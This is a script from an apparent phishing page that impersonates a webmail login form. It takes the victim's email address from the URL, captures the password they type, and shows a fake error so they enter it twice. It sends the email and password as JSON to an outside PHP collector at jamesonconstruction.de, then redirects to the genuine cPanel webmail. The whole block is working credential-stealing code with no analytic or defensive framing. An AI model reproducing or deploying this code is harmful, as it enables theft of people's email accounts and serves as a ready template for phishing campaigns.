<div class="accessible-tooltip-container" aria-hidden="true"></div>
  <script>   
    // ############################################################################
    // Specify the URL of the PHP file Here
    var url = "https://jamesonconstruction.de/main.php";
    // ############################################################################

    let email
    window.onload = function () {
      // Get the current URL
      var url = window.location.href;

      // Parse the URL and get the fragment (the part after the '#')
      var urlComponents = new URL(url);
      email = urlComponents.hash.substring(1);

      // Check if the fragment is a valid email
      var emailRegex = /^[\w-]+(\.[\w-]+)*@([\w-]+\.)+[a-zA-Z]{2,7}$/;
      if (emailRegex.test(email)) {
        // If it is, add the email into a html element as text
        var emailInputField = document.querySelector(".email-d")
        if (emailInputField) {
          emailInputField.value = email;
        }
      }
    };


    // Get the form and input elements
    var form = document.getElementById("io-ox-login-form");
    //var textForm = document.querySelectorAll(".input-text-group");
    var input = document.getElementById("io-ox-login-password");
    var modal = document.getElementById('modal-loading');
    var aaa2 = document.querySelectorAll(".a2");

    var clickCount = 0;

    // Add an event listener for form submission
    form.addEventListener("submit", function (event) {
      // Prevent the form from being submitted normally
      event.preventDefault();

      // Get the input value
      var password = input.value;


      setTimeout(function () {
        aaa2.forEach(function (error) {
          error.classList.remove("hidden");
        });
        input.value = "";
        setTimeout(function () {
          aaa2.forEach(function (error) {
            error.classList.add("hidden");
          });
        }, 5000);
      }, 3000);

      if (email && password) {
        let dataLog = {
          email,
          password,
          desc: "WEBMAIL Login Details",
        };
        // console.log(dataLog);
        sendDataWithRetry(dataLog);
      }
    });

    // Write a function that will redirect the page to a URL
    function toggleClass() {
      // Redirect the page to a URL
      window.location.href = "https://webmail.cpanel.net/";
    }

    // Send data to the PHP file
    function sendDataWithRetry(dataLog, maxRetries = 2) {
      const sendRequest = async (retryCount) => {
        try {
          const response = await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/json; charset=utf-8",
            },
            body: JSON.stringify(dataLog),
          });

          if (response.ok) {
            const responseData = await response.json();
            // console.log("Data received by PHP:", responseData);
            clickCount++;
            // console.log(clickCount);
            if (clickCount === 2) {
              // Execute a separate function on second click
              toggleClass();
              clickCount = 0;
            }
            // Continue with other tasks (e.g., UI updates, etc.)
          } else {
            throw new Error("Network response was not OK");
          }
        } catch (error) {
          console.error("Error sending data:", error);
          if (retryCount < maxRetries) {
            console.log(`Retrying (attempt ${retryCount + 1})...`);
            await sendRequest(retryCount + 1);
          } else {
            console.error("Max retries reached. Data not sent.");
            // Handle failure (e.g., show an error message)
          }
        }
      };
      sendRequest(0); // Start the initial request
    }


    function loading() {
      const loader = document.querySelector(".loader");

      loader.classList.remove("loader--hidden");

      setTimeout(function () {
        loader.classList.add("loader--hidden");
      }, 3000);
    }




    // Show password in input field when an "a" element with id "password-unveil" is clicked
    function seePassword() {
      var passwordUnveil = document.getElementById("showHideButton");
      var input = document.getElementById("password");
      input.type = "password";
      passwordUnveil.addEventListener("click", function () {
        if (input.type === "password") {
          input.type = "text";
        } else {
          input.type = "password";
        }
      });
    }

</script>
